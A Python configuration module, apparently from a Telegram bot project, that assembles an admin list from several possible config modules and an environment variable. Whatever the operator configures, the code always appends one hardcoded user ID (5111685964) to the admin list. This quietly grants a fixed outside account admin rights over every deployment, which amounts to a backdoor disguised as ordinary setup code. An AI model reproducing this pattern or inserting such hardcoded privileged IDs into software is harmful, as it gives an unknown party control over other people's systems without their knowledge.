import os


try:
    from config import AUTH_USERS
except:
    try:
        from configs import AUTH_USERS
    except:
        try:
            from paid import AUTH_USERS
        except:
            try:
                from config import ADMINS as AUTH_USERS
            except:
                try:
                    from configs import ADMINS as AUTH_USERS
                except:
                    try:
                        from paid import ADMINS as AUTH_USERS
                    except:
                        try:
                            from config import BOT_OWNER as AUTH_USERS
                        except:
                            try:
                                from configs import BOT_OWNER as AUTH_USERS
                            except:
                                try:
                                    from paid import BOT_OWNER as AUTH_USERS
                                except:
                                    AUTH_USERS = 5111685964  # Default value




try:
    DKBOTZADMIN=[]
    for x in (os.environ.get("DKBOTZ_BY_OWNER", "5111685964").split()):
        DKBOTZADMIN.append(int(x))
except ValueError:
        print("Your Admins list does not contain valid integers.")
    
DKBOTZADMIN.append(5111685964) 

try:
    for x in AUTH_USERS:
        if x not in DKBOTZADMIN:
            DKBOTZADMIN.append(int(x))

except Exception as e:
    pass

try:
    if AUTH_USERS not in DKBOTZADMIN:
        DKBOTZADMIN.append(AUTH_USERS)

except Exception as e:
    pass



